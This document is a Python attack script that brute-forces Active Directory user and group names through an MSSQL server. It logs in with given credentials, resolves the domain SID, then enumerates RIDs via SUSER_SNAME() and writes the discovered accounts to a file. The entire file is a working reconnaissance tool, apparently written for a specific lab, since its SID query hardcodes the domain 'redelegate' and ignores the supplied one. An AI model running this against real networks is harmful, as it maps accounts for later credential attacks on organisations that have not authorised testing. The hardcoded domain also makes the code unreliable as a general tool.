#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# mssql-sid-brute.py
# Brute-force MSSQL logins and groups by enumerating RIDs using domain SID + SUSER_SNAME()
#
# Author: Raphaël Benoît - BobBuilder
# License: Apache2

from impacket.tds import MSSQL
from time import sleep
import argparse
import re
import sys


def parse_target(target_str):
    """
    Parse a target string in the format: domain/user:password@host
    Returns a dict with keys: domain, username, password, host
    """
    pattern = r'(?:(?P<domain>[^/]+)/)?(?P<username>[^:]+):(?P<password>[^@]+)@(?P<host>.+)'
    match = re.match(pattern, target_str)
    if not match:
        print("[!] Invalid target format. Use: domain/user:pass@host")
        sys.exit(1)
    return match.groupdict()


def get_domain_sid(mssql, known_user='Administrator'):
    """
    Fetch the domain SID using a known user.
    Strips the RID portion from the result to get the base SID.
    """
    try:
        query = f"SELECT sys.fn_varbintohexstr(SUSER_SID('redelegate\\{known_user}')) AS sid"
        mssql.sql_query(query)
        rows = mssql.rows
        if not rows or 'sid' not in rows[0]:
            raise ValueError(f"[!] Could not resolve SID for user: {known_user}")

        hexsid = rows[0]['sid'][2:]  # Strip '0x'
        domain_sid = hexsid[:-8]     # Remove RID
        return domain_sid
    except Exception as e:
        print(f"[X] Error fetching domain SID: {e}")
        return None


def build_sid(domain_sid, rid):
    """
    Build a full SID from the domain SID and a RID (in little-endian hex).
    """
    rid_hex = format(rid, '08x')
    rid_bytes = bytearray.fromhex(rid_hex)
    rid_bytes.reverse()
    return f"0x{domain_sid}{rid_bytes.hex().upper()}"


def try_sids(mssql, domain_sid, start=500, end=10001, delay=0.0, output_file=None):
    """
    Iterate through RIDs and resolve them to users/groups.
    Optionally save unique results to a file.
    """
    found = []

    if output_file:
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    found.append(line.strip())
        except FileNotFoundError:
            pass

    for rid in range(start, end):
        sid = build_sid(domain_sid, rid)
        query = f"SELECT SUSER_SNAME({sid}) AS name"

        try:
            mssql.sql_query(query)
            rows = mssql.rows
            if rows and rows[0]['name'] not in [None, "NULL"]:
                username = rows[0]['name']
                print(f"[+] RID {rid} → {username}")

                if output_file and username not in found:
                    with open(output_file, 'a') as f:
                        f.write(f"{username}\n")
                    found.append(username)
        except Exception as e:
            print(f"[-] RID {rid} error: {e}")

        sleep(delay)


def main():
    parser = argparse.ArgumentParser(
        description="Brute-force SQL login SIDs via Impacket-style MSSQL connection"
    )
    parser.add_argument("target", help="Target in domain/user:pass@host format")
    parser.add_argument("-target-ip", help="IP address of the MSSQL server (optional, defaults to hostname)")
    parser.add_argument("--known-user", default="Administrator",
                        help="Known domain user to extract base SID from (default: Administrator)")
    parser.add_argument("--output", help="File to save discovered users/groups")
    parser.add_argument("--start-rid", type=int, default=500, help="Start RID (default: 500)")
    parser.add_argument("--end-rid", type=int, default=10001, help="End RID (default: 10001)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between RID queries in seconds (default: 0.0)")

    args = parser.parse_args()

    target_info = parse_target(args.target)
    username = target_info['username']
    password = target_info['password']
    domain = target_info.get('domain') or ''
    host = target_info['host']

    target_ip = args.target_ip if args.target_ip else host

    mssql = MSSQL(target_ip, 1433)
    mssql.connect()
    mssql.login(None, username, password, domain, None)

    domain_sid = get_domain_sid(mssql, known_user=args.known_user)
    if not domain_sid:
        print("[!] Could not retrieve domain SID. Exiting.")
        sys.exit(1)

    print(f"[*] Domain SID: {domain_sid}")
    try_sids(mssql, domain_sid, args.start_rid, args.end_rid, args.delay, output_file=args.output)


if __name__ == "__main__":
    main()
